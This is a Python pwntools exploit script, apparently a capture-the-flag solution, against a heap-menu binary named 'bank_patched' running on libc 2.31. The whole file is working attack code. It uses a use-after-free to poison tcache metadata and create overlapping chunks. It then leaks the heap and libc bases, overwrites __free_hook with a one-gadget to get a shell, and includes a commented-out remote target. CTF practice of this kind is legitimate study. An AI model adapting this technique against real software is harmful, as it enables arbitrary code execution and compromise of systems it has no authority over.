#!/usr/bin/env python3


from pwn import *

e = ELF("./bank_patched")
r = process("./bank_patched")
#r = remote("52.59.124.14",10200)
libc = ELF("./libc-2.31.so")
def malloc(data):
    r.sendlineafter(b"=>",b"1")
    r.sendafter(b"account:",data)
    r.recvuntil(b"New account created with id ")
    return int(r.recvline().strip())

def free(index):
    r.sendlineafter(b"=>",b"2")
    r.sendlineafter(b"delete:",f"{index}")


def loan(index,money):
    r.sendlineafter(b"=>",b"4")
    r.sendlineafter(b"like to borrow:",f"{money}")
    r.sendlineafter(b"loan:",f"{index}")

def borrow_money(sender,receiver,money):
    r.sendlineafter(b"=>",b"5")
    r.sendlineafter(b"send money from",f"{sender}")
    r.sendlineafter(b"send the money to:",f"{receiver}")
    r.sendlineafter(b"amount:",f"{money}")

def leak_heap(index):
    r.sendlineafter(b"=>",b"3")
    r.sendlineafter(b"view:",f"{index}")
    r.recvuntil(b"H" * 0xf0)
    leak = u64(r.recvline().rstrip(b", Balance: 0\n").strip().decode('latin-1').ljust(8,'\x00'))
    return leak


def leak_libc(index):
    r.sendlineafter(b"=>",b"3")
    r.sendlineafter(b"view:",f"{index}")
    r.recvuntil(b"J" * 24)
    leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00'))
    return leak
chunk_A = malloc(b"A" * 0x20)
chunk_B = malloc(b"B" * 0x20)
chunk_C = malloc(b"C" * 0xe0 + p64(0x111) + b"A" * 8)
chunk_D = malloc(b"D" * 0xd8 + p64(0x110)  + p64(0x111))
chunk_E = malloc(b"E" * 0x20)
free(chunk_E)
free(chunk_B)
free(chunk_A)
loan(chunk_D,100)
borrow_money(chunk_D,chunk_A,2)
log.info("Using a restrictive uaf to modify 2nd byte of the tcache metadata to push a address to free list to create overlapping chunks")
chunk_F = malloc(b"F" * 0x20)
chunk_G = malloc(b"G" * 0x10)
free(chunk_G)
free(chunk_C)
overlap_reader = malloc(b"H" * 0xf0)
log.info("Using the overlapping chunk to read tcache metadata to get heap base")
heap_base = leak_heap(overlap_reader) - 0x10
log.info("The heap base of the process is " + hex(heap_base))
free(overlap_reader)
overlap_writer = malloc(b"I" * 0xe0 + p64(0x111) + p64(heap_base+0x20))
log.info("Using the restrictive UAF to push tcache chunk into free list to tamper the count structure to get libc leaks")
fake_size = malloc(p64(0x111) * 4)
tcache_tamper = malloc(p32(0) + p16(0) + p8(0x6) + p8(0) + b"\x00" * 0xd8 + p64(heap_base+0x20))
free(fake_size)
free(chunk_D)
heap_leaker = malloc(b"J" * 24)
libc_base = leak_libc(heap_leaker) - 0x1ecbe0
log.info("Using the overlapping chunks to read unsortedbin metadata to get libc base")
tcache_tamper2 = malloc(p32(0) + p16(0) + p8(0x6) + p8(0) + b"\x00" * 0xd8 + p64(libc_base + libc.sym.__free_hook - 0x8))
free_hook_overwrite = malloc(p64(libc_base + 0xe3b31))
log.info("Overwrite free hook with the address of one gadget")
free(chunk_F)
r.interactive()
